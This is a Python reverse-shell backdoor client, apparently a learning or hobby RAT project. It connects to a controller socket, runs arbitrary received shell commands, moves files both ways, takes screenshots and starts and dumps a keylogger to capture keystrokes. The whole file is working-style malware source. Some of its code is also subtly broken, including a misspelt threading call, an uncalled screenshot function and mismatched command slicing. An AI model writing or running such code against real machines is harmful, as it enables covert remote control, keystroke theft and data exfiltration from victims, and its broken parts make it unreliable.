import socket, json, subprocess, os, pyautogui, keylogger, threading
from termcolor import colored

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try: 
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except UnicodeDecodeError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    myscreenshot = pyautogui.screenshot
    myscreenshot.save('screenshot.png')

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        elif command == 'help':
           pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[:7])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            os.remove('screenshot.png')
        elif command[:12] == 'keylogger':
            keylog = keylogger.Keylogger()
            t = threading.Tread(target=keylog.start)
            t.start()
            reliable_send(colored('[+] keylogger started', 'green'))
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send(colored('[+] keylogger stopped', 'green'))
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555))
shell()